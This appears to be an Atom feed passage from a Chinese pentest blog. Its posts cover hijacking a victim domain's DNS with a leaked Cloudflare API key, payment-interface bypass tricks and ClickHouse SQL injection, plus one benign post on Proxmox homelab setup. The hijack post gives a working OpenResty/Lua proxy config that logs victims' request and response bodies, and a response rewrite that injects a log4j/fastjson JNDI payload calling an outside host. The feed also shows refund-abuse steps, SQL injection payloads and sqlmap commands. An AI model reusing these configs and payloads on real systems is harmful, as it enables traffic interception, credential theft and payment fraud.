builtin class-name">:</span><span class="token string">"_acme-challenge.&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"TK..."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="删除DNS-Record"><a href="#删除DNS-Record" class="headerlink" title="删除DNS Record"></a>删除DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">DELETE https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>不管是CNAME解析还是A解析都可以修改为A解析的方式，劫持域名到自己的服务器，前提是使用OpenResty把反代设置好，配置文件主要参考<a href="https://gist.github.com/virusdefender/984c2a304001d8de20049301b478700a/revisions">virusdefender师傅</a>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>    listen <span class="token number">80</span><span class="token punctuation">;</span>    server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    <span class="token builtin class-name">return</span> <span class="token number">301</span> https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token variable">$request_uri</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>server <span class="token punctuation">&#123;</span>listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    proxy_ssl_server_name on<span class="token punctuation">;</span>    proxy_ssl_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    ssl_certificate /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/fullchain.cer<span class="token punctuation">;</span>    ssl_certificate_key /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>error_log stderr error<span class="token punctuation">;</span>location / <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host <span class="token variable">$host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        body_filter_by_lua <span class="token string">'            ngx.ctx.buffered = (ngx.ctx.buffered or "") .. ngx.arg[1]            if ngx.arg[2] then                ngx.var.resp_body = ngx.ctx.buffered            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();        if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end            ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>access_log /home/wwwlogs/access.log<span class="token punctuation">;</span>error_log /home/wwwlogs/error.log<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想看记录所有的请求，把上面的请求方法判断去掉就可以了。</p><h3 id="X-Forwarded-For字段"><a href="#X-Forwarded-For字段" class="headerlink" title="X-Forwarded-For字段"></a>X-Forwarded-For字段</h3><p>假如需要劫持的是一个中间代理域名，上游服务器是通过白名单IP来限制访问，获取IP的方式是通过XFF，这时候需要把XFF设置为<code>$remote_addr</code></p><h3 id="Host字段"><a href="#Host字段" class="headerlink" title="Host字段"></a>Host字段</h3><p>这里有一个很奇怪的问题，大概是取决于upstream的配置，有时候需要配置为<code>proxy_set_header Host $host</code>，但是有时候可能是<code>proxy_set_header Host $proxy_host</code>。</p><p>在以上都设置好之后，利用本地hosts绑定的方式先测试网站的接口功能是否正常，生成的日志是否正常。另外可以给80和443端口另外单独做一个默认配置，这样可以防止扫描器等日志出现，只单独记录反代的日志，<br>比如443端口新增一个自定义证书：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl genrsa -out privatekey.pem <span class="token number">2048</span>openssl req -new -key privatekey.pem -out private-csr.pemopenssl x509 -req -days <span class="token number">365</span> -in private-csr.pem -signkey privatekey.pem -out certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改OpenResty配置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>        listen       <span class="token number">443</span> ssl<span class="token punctuation">;</span>        server_name  localhost default<span class="token punctuation">;</span>        ssl_certificate      /usr/local/openresty/nginx/certs/certificate.pem<span class="token punctuation">;</span>        ssl_certificate_key  /usr/local/openresty/nginx/certs/privatekey.pem<span class="token punctuation">;</span>        ssl_session_cache    shared:SSL:1m<span class="token punctuation">;</span>        ssl_session_timeout  5m<span class="token punctuation">;</span>        ssl_ciphers  HIGH:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_prefer_server_ciphers  on<span class="token punctuation">;</span>        location / <span class="token punctuation">&#123;</span>            root   html<span class="token punctuation">;</span>            index  index.html index.htm<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过上面设置这时候反代已经设置好可以进行流量劫持了，先记录原有的DNS解析，然后通过API修改域名的解析记录，解析道自己的服务器上，必要的情况下需要重新改回来：</p><h4 id="修改解析记录"><a href="#修改解析记录" class="headerlink" title="修改解析记录"></a>修改解析记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;attack ip>"</span>, <span class="token string">"proxiable"</span><span class="token builtin class-name">:</span> false, <span class="token string">"proxied"</span><span class="token builtin class-name">:</span> false<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="修改Response"><a href="#修改Response" class="headerlink" title="修改Response"></a>修改Response</h2><p>如果有其他的需求，比如修改Response用来测试客户端是否存在fastjson或者log4j漏洞，可以增加以下Lua代码，来修改特定的接口返回值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">location /some-api <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span> <span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host   <span class="token variable">$proxy_host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        header_filter_by_lua_block <span class="token punctuation">&#123;</span> ngx.header.content_length <span class="token operator">=</span> nil <span class="token punctuation">&#125;</span>        body_filter_by_lua <span class="token string">'            local chunk, eof = ngx.arg[1], ngx.arg[2]            local buffered = ngx.ctx.buffered            if not buffered then            buffered = &#123;&#125;  -- XXX we can use table.new here             ngx.ctx.buffered = buffered            end            if chunk ~= "" then            buffered[#buffered + 1] = chunk            ngx.arg[1] = nil            end            if eof then            local whole = table.concat(buffered)            ngx.ctx.buffered = nil            -- try to unzip            -- local status, debody = pcall(com.decode, whole)             -- if status then whole = debody end            -- try to add or replace response body            -- local js_code = ...            -- whole = whole .. js_code            ngx.log(ngx.ERR, whole)            whole = string.gsub(whole, ".+",  "&#123;\\"@type\\":\\"java.net.Inet6Address\\",\\"value\\":\\"dnslog\\", \\"message\\":\\"$&#123;jndi:ldap://dnslog&#125;\\"&#125;")            ngx.arg[1] = whole            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();         if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                 ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end                        ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。&lt;/p&gt;
&lt;h2 id=&quot;攻击流程&quot;&gt;&lt;a href=&quot;#攻击流程&quot; class=&quot;headerlink&quot; title=&quot;攻击流程&quot;&gt;&lt;/a&gt;攻击流程&lt;/h2&gt;&lt;p&gt;首先可以通过API接口查看泄漏的key是否生效：&lt;/p&gt;
&lt;h4 id=&quot;查看Zones&quot;&gt;&lt;a href=&quot;#查看Zones&quot; class=&quot;headerlink&quot; title=&quot;查看Zones&quot;&gt;&lt;/a&gt;查看Zones&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;GET https://api.cloudflare.com/client/v4/zones&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;查看Zones对应的DNS记录&quot;&gt;&lt;a href=&quot;#查看Zones对应的DNS记录&quot; class=&quot;headerlink&quot; title=&quot;查看Zones对应的DNS记录&quot;&gt;&lt;/a&gt;查看Zones对应的DNS记录&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;GET https://api.cloudflare.com/client/v4/zones/&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;ZONE ID&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/dns_records&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;查看审计日志&quot;&gt;&lt;a href=&quot;#查看审计日志&quot; class=&quot;headerlink&quot; title=&quot;查看审计日志&quot;&gt;&lt;/a&gt;查看审计日志&lt;/h4&gt;&lt;p&gt;获取最近的登陆日志、操作日志、客户端IP等：&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>支付接口安全测试记录</title>
    <link href="https://jkme.github.io/2023/01/16/pay_vuln.html"/>
    <id>https://jkme.github.io/2023/01/16/pay_vuln.html</id>
    <published>2023-01-15T16:00:00.000Z</published>
    <updated>2023-01-16T10:10:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x1-低价值替换高价值SKU"><a href="#0x1-低价值替换高价值SKU" class="headerlink" title="0x1. 低价值替换高价值SKU"></a>0x1. 低价值替换高价值SKU</h3><p>在IOS平台上面支付完成之后，立刻杀掉进程，然后重新开启APP抓包，此时触发补单操作，拦截包之后，修改sku字段为高价值商品，尝试是否可以成功。</p><p>或者在Burp抓支付包的时候，因为apple服务接口验证了证书，可以在burp的<code>TLS Pass Through</code>配置绕过apple的域名，不对其进行抓包。</p><h3 id="0x2-替换订单号"><a href="#0x2-替换订单号" class="headerlink" title="0x2. 替换订单号"></a>0x2. 替换订单号</h3><p>首先产生一个未支付的高价值的订单号，其次正常购买低价值商品，打断后端返回的response，替换response里面的订单号为高价值订单号，然后尝试支付成功之后商品的数量。一般适用于Google支付。</p><h3 id="0x3-利用Google机制自动退款"><a href="#0x3-利用Google机制自动退款" class="headerlink" title="0x3. 利用Google机制自动退款"></a>0x3. 利用Google机制自动退款</h3><p>Google的SDK支付成功之后，客户端会发起一个接口请求: <a href="https://play-fe.googleapis.com/fdfe/consumePurchase">https://play-fe.googleapis.com/fdfe/consumePurchase</a> </p><p>Google Play结算服务官方文档中关于处理购买交易的描述：在三天内未确认购买交易，则用户会自动收到退款，并且Google Play会撤消该购买交易，可以利用此规则进行退款。这种攻击一般针对一次性消耗品，当然重复的也可以。在支付完成之后，拦截上面的请求之后丢弃，如果服务端未做正确处理，则三天之后Google会自动退款。</p><p>修复方式：后端手动调用确认接口进行二次确认<a href="https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge">acknowledge</a>，一般400可以视为已确认，409的时候需要查询一次状态，已确认状态可以放行，否则掉单处理。</p><h3 id="测试注意点"><a href="#测试注意点" class="headerlink" title="测试注意点"></a>测试注意点</h3><ul><li>某些版本的Burp抓不到Google的消费请求，或者是Burp显示DF-DFERH-01错误，这时候多更换burp版本试试，比如社区版</li><li>熟练利用Burp的<code>TLS Pass Through</code>和<code>Intercept Client Requests</code>功能抓包。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x1-低价值替换高价值SKU&quot;&gt;&lt;a href=&quot;#0x1-低价值替换高价值SKU&quot; class=&quot;headerlink&quot; title=&quot;0x1. 低价值替换高价值SKU&quot;&gt;&lt;/a&gt;0x1. 低价值替换高价值SKU&lt;/h3&gt;&lt;p&gt;在IOS平台上面支付完成之后，立刻杀掉进程，然后重新开启APP抓包，此时触发补单操作，拦截包之后，修改sku字段为高价值商品，尝试是否可以成功。&lt;/p&gt;
&lt;p&gt;或者在Burp抓支付包的时候，因为apple服务接口验证了证书，可以在burp的&lt;code&gt;TLS Pass Through&lt;/code&gt;配置绕过apple的域名，不对其进行抓包。&lt;/p&gt;
&lt;h3 id=&quot;0x2-替换订单号&quot;&gt;&lt;a href=&quot;#0x2-替换订单号&quot; class=&quot;headerlink&quot; title=&quot;0x2. 替换订单号&quot;&gt;&lt;/a&gt;0x2. 替换订单号&lt;/h3&gt;&lt;p&gt;首先产生一个未支付的高价值的订单号，其次正常购买低价值商品，打断后端返回的response，替换response里面的订单号为高价值订单号，然后尝试支付成功之后商品的数量。一般适用于Google支付。&lt;/p&gt;
&lt;h3 id=&quot;0x3-利用Google机制自动退款&quot;&gt;&lt;a href=&quot;#0x3-利用Google机制自动退款&quot; class=&quot;headerlink&quot; title=&quot;0x3. 利用Google机制自动退款&quot;&gt;&lt;/a&gt;0x3. 利用Google机制自动退款&lt;/h3&gt;&lt;p&gt;Google的SDK支付成功之后，客户端会发起一个接口请求: &lt;a href=&quot;https://play-fe.googleapis.com/fdfe/consumePurchase&quot;&gt;https://play-fe.googleapis.com/fdfe/consumePurchase&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Google Play结算服务官方文档中关于处理购买交易的描述：在三天内未确认购买交易，则用户会自动收到退款，并且Google Play会撤消该购买交易，可以利用此规则进行退款。这种攻击一般针对一次性消耗品，当然重复的也可以。在支付完成之后，拦截上面的请求之后丢弃，如果服务端未做正确处理，则三天之后Google会自动退款。&lt;/p&gt;
&lt;p&gt;修复方式：后端手动调用确认接口进行二次确认&lt;a href=&quot;https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge&quot;&gt;acknowledge&lt;/a&gt;，一般400可以视为已确认，409的时候需要查询一次状态，已确认状态可以放行，否则掉单处理。&lt;/p&gt;
&lt;h3 id=&quot;测试注意点&quot;&gt;&lt;a href=&quot;#测试注意点&quot; class=&quot;headerlink&quot; title=&quot;测试注意点&quot;&gt;&lt;/a&gt;测试注意点&lt;/h3&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>PVE使用注意事项</title>
    <link href="https://jkme.github.io/2022/11/08/pve_homelab.html"/>
    <id>https://jkme.github.io/2022/11/08/pve_homelab.html</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-25T07:43:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>组建的PVE使用的是这个方案: <a href="https://foxi.buduanwang.vip/virtualization/1183.html/">PVE+TrueNAS+ZFS+10G内网方案</a></p><h2 id="虚拟机磁盘选择"><a href="#虚拟机磁盘选择" class="headerlink" title="虚拟机磁盘选择"></a>虚拟机磁盘选择</h2><p>使用的时候创建的Windows虚拟机特别慢，打开管理器一看磁盘最高只有5M/S的写入速度，发现是选择的磁盘类型不同，在创建虚拟机的时候最好选择<a href="https://foxi.buduanwang.vip/virtualization/pve/1214.html/">SCSI的磁盘格式</a></p><p>比如在新建Windows虚拟机的时候，一般需要以下<a href="https://www.dudr.top/index.php/archives/121/">步骤</a>：</p><ol><li>下载<a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso">VirtIO驱动镜像</a></li><li>将镜像文件上传到 PVE 的 ISO镜像中</li><li>按照常规流程创建虚拟机，不启动</li><li>在虚拟机的 “硬件” 选项卡内添加 “CD/DVD驱动器”</li><li>挂载 win10 系统镜像和 VirtIO 驱动镜像 (CD1: win10.iso，CD2: virtio-win.iso)</li><li>检查虚拟机的 “选项” 选项卡内的 “引导顺序</li><li>启动虚拟机 &gt; “加载驱动程序” &gt; “浏览” D:\amd64\win10 &gt; “下一步”，安装驱动程序</li><li>驱动安装后在磁盘列表就会检测到硬盘，继续后续系统安装步骤</li></ol><p>但是我现在已经装好了虚拟机，需要把IDE类型的磁盘转换为SCSI：</p><ol><li>已有的虚拟机插入两个ISO设备，一个是Win10镜像，一个是Virto镜像</li><li>开机启动进入Win10镜像，然后<code>SHIFT+F10</code>调出cmd</li><li>确定C盘的盘符和Virto的盘符，输入命令<code>dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64</code></li><li>随后关机: <code>wpeutil shutdown -s</code></li><li>在PVE虚拟机界面分离磁盘，把磁盘类型改为SCSI，随后重启即可</li></ol><p><img src="/2022/11/08/pve_homelab/1.png"></p><p>改完之后的写入速度在40M/S～50M/S左右</p><h2 id="数据的备份和关机顺序"><a href="#数据的备份和关机顺序" class="headerlink" title="数据的备份和关机顺序"></a>数据的备份和关机顺序</h2><h3 id="Windows备份"><a href="#Windows备份" class="headerlink" title="Windows备份"></a>Windows备份</h3><p>假如需要在Windows里面增量备份A目录到共享文件夹，可以选择新增计划任务，每5分钟备份一次：</p><ol><li>计划任务: <code>robocopy C:\Users\Administrator\source\repos \\truenas\source /mir</code></li><li>修改计划任务的触发器和运行的脚本</li></ol><h3 id="PVE关机顺序"><a href="#PVE关机顺序" class="headerlink" title="PVE关机顺序"></a>PVE关机顺序</h3><p>背景是开了好几个虚拟机，然后直接在PVE系统里面直接shutdown，当有其他虚拟机运行的时候，可能会数据丢失。我的truenas虚拟机ID是100，新建一个脚本<code>pve_shutdown</code>，在每次关机的时候顺序关闭虚拟机，最后关闭truenas，同时新增一个快照备份:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">RUNNING_PVE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>qm list <span class="token operator">|</span><span class="token function">grep</span> running <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">pve</span> <span class="token keyword">in</span> <span class="token variable">$RUNNING_PVE</span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$pve</span> <span class="token operator">!=</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    qm snapshot <span class="token variable">$pve</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>    <span class="token function">rm</span> -rf /run/lock/qemu-server/lock-<span class="token variable">$pve</span>.conf    qm unlock <span class="token variable">$pve</span>    qm <span class="token function">shutdown</span> <span class="token variable">$pve</span>    <span class="token keyword">fi</span><span class="token keyword">done</span>qm snapshot <span class="token number">100</span> <span class="token string">"date-<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%Y%m%d<span class="token variable">)</span></span>"</span>qm -rf /run/lock/qemu-server/lock-100.confqm unlock <span class="token number">100</span>qm <span class="token function">shutdown</span> <span class="token number">100</span><span class="token function">shutdown</span> now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上面脚本保存为<code>pve_shutdown</code>，放在环境变量里面，然后使用快捷指令的运行SSH脚本，这样在手机上就可以关机了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;组建的PVE使用的是这个方案: &lt;a href=&quot;https://foxi.buduanwang.vip/virtualization/1183.html/&quot;&gt;PVE+TrueNAS+ZFS+10G内网方案&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;虚拟机磁盘选择&quot;&gt;&lt;a href=&quot;#虚拟机磁盘选择&quot; class=&quot;headerlink&quot; title=&quot;虚拟机磁盘选择&quot;&gt;&lt;/a&gt;虚拟机磁盘选择&lt;/h2&gt;&lt;p&gt;使用的时候创建的Windows虚拟机特别慢，打开管理器一看磁盘最高只有5M/S的写入速度，发现是选择的磁盘类型不同，在创建虚拟机的时候最好选择&lt;a href=&quot;https://foxi.buduanwang.vip/virtualization/pve/1214.html/&quot;&gt;SCSI的磁盘格式&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;比如在新建Windows虚拟机的时候，一般需要以下&lt;a href=&quot;https://www.dudr.top/index.php/archives/121/&quot;&gt;步骤&lt;/a&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;下载&lt;a href=&quot;https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso&quot;&gt;VirtIO驱动镜像&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;将镜像文件上传到 PVE 的 ISO镜像中&lt;/li&gt;
&lt;li&gt;按照常规流程创建虚拟机，不启动&lt;/li&gt;
&lt;li&gt;在虚拟机的 “硬件” 选项卡内添加 “CD/DVD驱动器”&lt;/li&gt;
&lt;li&gt;挂载 win10 系统镜像和 VirtIO 驱动镜像 (CD1: win10.iso，CD2: virtio-win.iso)&lt;/li&gt;
&lt;li&gt;检查虚拟机的 “选项” 选项卡内的 “引导顺序&lt;/li&gt;
&lt;li&gt;启动虚拟机 &amp;gt; “加载驱动程序” &amp;gt; “浏览” D:\amd64\win10 &amp;gt; “下一步”，安装驱动程序&lt;/li&gt;
&lt;li&gt;驱动安装后在磁盘列表就会检测到硬盘，继续后续系统安装步骤&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是我现在已经装好了虚拟机，需要把IDE类型的磁盘转换为SCSI：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;已有的虚拟机插入两个ISO设备，一个是Win10镜像，一个是Virto镜像&lt;/li&gt;
&lt;li&gt;开机启动进入Win10镜像，然后&lt;code&gt;SHIFT+F10&lt;/code&gt;调出cmd&lt;/li&gt;
&lt;li&gt;确定C盘的盘符和Virto的盘符，输入命令&lt;code&gt;dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;随后关机: &lt;code&gt;wpeutil shutdown -s&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在PVE虚拟机界面分离磁盘，把磁盘类型改为SCSI，随后重启即可&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/2022/11/08/pve_homelab/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;改完之后的写入速度在40M/S～50M/S左右&lt;/p&gt;
&lt;h2 id=&quot;数据的备份和关机顺序&quot;&gt;&lt;a href=&quot;#数据的备份和关机顺序&quot; class=&quot;headerlink&quot; title=&quot;数据的备份和关机顺序&quot;&gt;&lt;/a&gt;数据的备份和关机顺序&lt;/h2&gt;</summary>
    
    
    
    <category term="Fun" scheme="https://jkme.github.io/categories/Fun/"/>
    
    
  </entry>
  
  <entry>
    <title>ClickHouse注入测试记录</title>
    <link href="https://jkme.github.io/2022/10/27/clickhouse-sql-inject.html"/>
    <id>https://jkme.github.io/2022/10/27/clickhouse-sql-inject.html</id>
    <published>2022-10-26T16:00:00.000Z</published>
    <updated>2022-10-27T09:19:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>根据源代码发现可以利用<code>&#39;)</code>拼接闭合SQL语句之后，插入要注入的Payload，比如：<code>1&#39;)and sleep(3) and (&#39;1</code>，可以休眠3S。经过测试发现存在以下限制：</p><ul><li>sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回</li><li>sleep关键词不能使用大写，因为clickhouse函数大小写敏感</li><li>无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库</li></ul><p>虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，<del>可能这就是脚本小子吧</del></p><p>经过我不懈努力，终于让Sqlmap跑出来了可注入点:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlmap.py -r ~/Desktop/sql.txt -v --technique<span class="token operator">=</span>T --level <span class="token number">3</span> -v <span class="token number">3</span> --dbms MySQL --time-sec <span class="token number">3</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"and ('"</span> --tamper lowercase --proxy http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10/27/clickhouse-sql-inject/1.png"></p><p>为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的<code>SLEEP(5)</code>是自带的payload，就算是加了<code>--tamper lowercase</code>也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：</p><ol><li>写个Burp插件转变成小写–费时费力</li><li>修改Sqlmap的源代码–这个简单</li></ol><p>于是乎，我直接编辑sqlmap目录下的<code>data/xml/payloads/time_blind.xml</code>，直接把<code>SLEEP</code>替换为<code>sleep</code>，然后发现会影响<code>SLEEPTIME</code>这个变量，再替换一次<code>sleepTime</code>为<code>SLEEPTIME</code>。</p><p>跑出来注入点没问题了，但是Sqlmap跑完之后会二次确认是否对应的数据库，会再发送几个payload二次确认数据库的类型。到此时我就傻眼了，特么那我前面干了啥(<del>不愧是脚本小子</del>)。</p><h2 id="手工阶段"><a href="#手工阶段" class="headerlink" title="手工阶段"></a>手工阶段</h2><p>尝试使用报错注入的payload可以成功获取数据：</p><ul><li><code>&#39;) and (select 